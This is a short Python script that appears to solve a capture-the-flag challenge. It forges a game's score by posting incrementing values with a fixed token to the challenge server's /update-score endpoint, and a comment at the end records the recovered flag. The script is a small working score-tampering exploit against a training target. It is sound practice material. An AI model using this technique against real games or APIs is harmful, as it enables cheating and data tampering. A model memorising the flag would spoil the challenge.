import requests
import time

site = "http://floppybird.challs.olicyber.it/"

for i in range (1001):
    r = requests.post(f"{site}/update-score", json={"token":"8c790b67d0ccafb8a088132a806ea3a6","score": i})
    print(f"punteggio {i}: " , r.text)
    time.sleep(0.01)

#ptm{n3v3r_7rus7_cl13n7_s1d3_d4ta}